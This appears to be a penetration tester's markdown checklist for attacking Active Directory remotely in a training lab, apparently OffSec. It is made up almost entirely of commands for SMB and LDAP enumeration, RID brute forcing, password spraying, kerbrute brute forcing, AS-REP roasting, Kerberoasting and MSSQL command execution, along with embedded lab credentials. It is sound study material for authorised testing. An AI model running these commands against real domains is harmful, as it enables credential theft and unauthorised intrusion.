## AD Checklist - Remote Enumeration

Run through all of the relevant ports' mds. All privilege escalation and local enumeration is is windows-enumeration.md.

```bash
nxc smb 192.168.165.40
export ip=192.168.165.40; export dom=hokkaido-aerospace.com; export dc=dc.hokkaido-aerospace.com;clear

sudo autorecon $ip --subdomain-enum.domain $dom --global.domain $dom

sudo ntpdate $ip

enum4linux -a $ip
enum4linux -a -M -l -d $ip 2>&1
enum4linux -a -u "$dom\\$user" -p "winniethepooh" $ip
enum4linux -a -u "$dom\\$user" -p "" -M -l -d $ip 2>&1
enum4linux -a -M -l -d $dom 2>&1 && enum4linux-ng $dom -A -C

enum4linux-ng $ip
enum4linux-ng $ip -A -C
enum4linux-ng $ip -u $user -p $pass -oY out

smbclient -L //$ip
smbclient -N -L //$ip
smbclient -L //$ip -N

nxc smb $ip -u 'a' -p '' --shares
nxc smb $ip -u 'a' -p '' --all
nxc smb $ip -u 'guest' -p '' --shares
nxc smb $ip -u 'administrator' -p 'fake' --shares
nxc smb $ip -u '' -p 'fake' --shares
nxc smb $ip -u users.txt -p users.txt --no-bruteforce --continue-on-success
nxc smb $ip -u ‘guest’ -p ‘’ --rid-brute
nxc smb $ip -u ‘guest’ -p ‘’ --rid-brute > u.txt

rpcclient -U "admin" $ip 
rpcclient $ip -N -U ""

# Check if password policy was manually made easier, hidden passwords
ldapsearch -x -H ldap://$ip
ldapsearch -x -H ldap://$ip -s base namingcontexts
ldapsearch -x -H ldap://$ip -b "DC=,DC="
ldapsearch -x -H ldap://$ip -b "DC=,DC=" '(objectClass=Person)'
ldapsearch -x -H ldap://$ip -b "DC=,DC=" '(objectClass=Person)' sAMAccountName sAMAccountType
ldapsearch -x -H ldap://$ip -b "DC=DomainDnsZones,DC=,DC="
ldapsearch -H ldap://$ip -D "enox@$dom" -w "$pass" -b 'dc=,dc='
ldapsearch -x -H ldap://$ip -b "DC=,DC=" | grep -vi "objectClass\|distinguishedName\|instanceType\|whenCreated\|whenChanged\|uSNCreated\|uSNChanged\|objectGUID\|userAccountControl\|codePage\|countryCode\|objectSid\|accountExpires\|sAMAccountType\|isCriticalSystemObject\|dSCorePropagationData\|lastLogonTimestamp\|showInAdvancedViewOnly\|groupType\|msDS-SupportedEncryptionTypes:\|lastLogoff\|badPasswordTime\|ref:\|#\ num\|#\ search\|search:\|result:" | grep -i "pass\|pwd"
ldapsearch -x -H ldap://$ip -b "DC=,DC=" '(objectClass=Person)' | grep -vi "objectClass\|distinguishedName\|instanceType\|whenCreated\|whenChanged\|uSNCreated\|uSNChanged\|objectGUID\|userAccountControl\|codePage\|countryCode\|objectSid\|accountExpires\|sAMAccountType\|isCriticalSystemObject\|dSCorePropagationData\|lastLogonTimestamp\|showInAdvancedViewOnly\|groupType\|msDS-SupportedEncryptionTypes:\|lastLogoff\|badPasswordTime\|ref:\|#\ num\|#\ search\|search:\|result:"
ldapsearch -x -H ldap://$ip -b "DC=,DC=" '(objectClass=Person)' | grep -vi "objectClass\|distinguishedName\|instanceType\|whenCreated\|whenChanged\|uSNCreated\|uSNChanged\|objectGUID\|userAccountControl\|codePage\|countryCode\|objectSid\|accountExpires\|sAMAccountType\|isCriticalSystemObject\|dSCorePropagationData\|lastLogonTimestamp\|showInAdvancedViewOnly\|groupType\|msDS-SupportedEncryptionTypes:\|lastLogoff\|badPasswordTime\|ref:\|#\ num\|#\ search\|search:\|result:" | grep -i "pass\|pwd"

# If you attempt to authenticate to an AD server via Kerberos, it's going to say 'hey, continue with pre-authentication'. It doesn't do that with invalid names.
/opt/kerbrute userenum usernames.txt -d "$dom" --dc $ip
/opt/kerbrute userenum -d $dom --dc $ip /opt/SecLists/Usernames/xato-net-10-million-usernames-dup-lowercase.txt -t 100
/opt/kerbrute bruteuser -d $dom ../passwords.txt maintenance --dc $ip 

psexec.py

impacket-GetADUsers -dc-ip $ip "$dom/" -all
impacket-GetADUsers -dc-ip $ip $dom/$user:CrabSharkJellyfish192 -all

# Even if you don't have a password, use their username to auth
GetNPUsers.py -request -format hashcat -outputfile asrep.txt "$dom/$user"
GetNPUsers.py -request -format hashcat -outputfile asrep.txt -dc-ip $ip '$dom/'
GetNPUsers.py -request -format hashcat -outputfile asrep.txt -dc-ip $ip $dom/user:password
GetNPUsers.py $dom/ -dc-ip $ip -usersfile users.txt -format hashcat -outputfile hashes.txt

impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip $ip '$dom/'
impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip $ip $dom/user:password

/opt/windows/nxc.sh $ip

impacket-mssqlclient discovery:Start123\!@192.168.165.40 -windows-auth
nxc mssql -d hokkaido-aerospace.com -u discovery -p 'Start123!' -x "whoami" 192.168.165.40 -q 'SELECT name FROM master.dbo.sysdatabases;'
nxc mssql -d hokkaido-aerospace.com -u discovery -p 'Start123!' -x "whoami" 192.168.165.40 -q 'use hrappdb; select * from hrappdb..sysobjects;' --port 58538 -M mssql_priv

source /opt/windows/targetedKerberoast/venv/bin/activate
python /opt/windows/targetedKerberoast/targetedKerberoast.py -d $dom -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip $ip

Invoke-adPEAS -Domain 'access.offsec' -Server 'dc.access.offsec' -Username 'access\svc_mssql' -Password 'trustno1' -Force
Invoke-ADEnum -AllEnum -Force
.\pingcastle.exe --healthcheck --user access\svc_mssql --password trustno1 --level Full

.\Seatbelt.exe -group=all
```